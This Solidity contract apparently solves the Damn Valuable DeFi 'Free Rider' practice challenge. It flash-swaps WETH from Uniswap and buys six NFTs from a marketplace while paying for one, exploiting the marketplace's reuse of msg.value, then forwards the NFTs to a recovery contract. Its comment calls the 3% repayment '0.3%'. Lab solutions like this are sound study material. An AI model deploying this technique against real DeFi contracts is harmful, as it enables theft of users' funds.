// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "hardhat/console.sol";
import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderRecovery.sol";
import "../DamnValuableNFT.sol";
import "solmate/src/tokens/WETH.sol";

interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract Exploit {
    IUniswapV2Pair uniswapPair;
    IERC20 token;
    WETH weth;
    address uniswapRounter;
    DamnValuableNFT nft;
    FreeRiderNFTMarketplace marketplace;
    FreeRiderRecovery devsContract;
    address player;

    uint256 NFT_PRICE = 15 ether;

    constructor(address _uniswapPair, address _token, address payable _weth, address _uniswapRounter, address _nft, address payable _marketplace, address _devsContract, address _playerAddress) public payable {
        uniswapPair = IUniswapV2Pair(_uniswapPair);
        token = IERC20(_token);
        weth = WETH(_weth);
        uniswapRounter = _uniswapRounter;
        nft = DamnValuableNFT(_nft);
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        devsContract = FreeRiderRecovery(_devsContract);
        player = _playerAddress;
    }

    function exploit(uint amount) external {
        assert(uniswapPair.token0() == address(weth));
        uniswapPair.swap(amount, 0, address(this), "0x");
    }

    function uniswapV2Call(address sender, uint amount0, uint, bytes calldata data) external {
        require(weth.balanceOf(address(this))  <= address(weth).balance);
        weth.withdraw(amount0);

        uint256[] memory tokenIds = new uint256[](6);
        for (uint i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }
        marketplace.buyMany{value: NFT_PRICE}(tokenIds);

        uint amountToRepay = (amount0 * 103) / 100; // 0.3%
        weth.deposit{value: amountToRepay}();
        weth.transfer(address(uniswapPair), amountToRepay);
    }

    function onERC721Received(address, address, uint256 _tokenId, bytes memory _data)
        external
        returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }

    function transferNft(uint id) public {
        // XXX: Why do we need this function?
        bytes memory data = abi.encode(player);
        nft.safeTransferFrom(address(this), address(devsContract), id, data);
    }

    receive() external payable {}
}
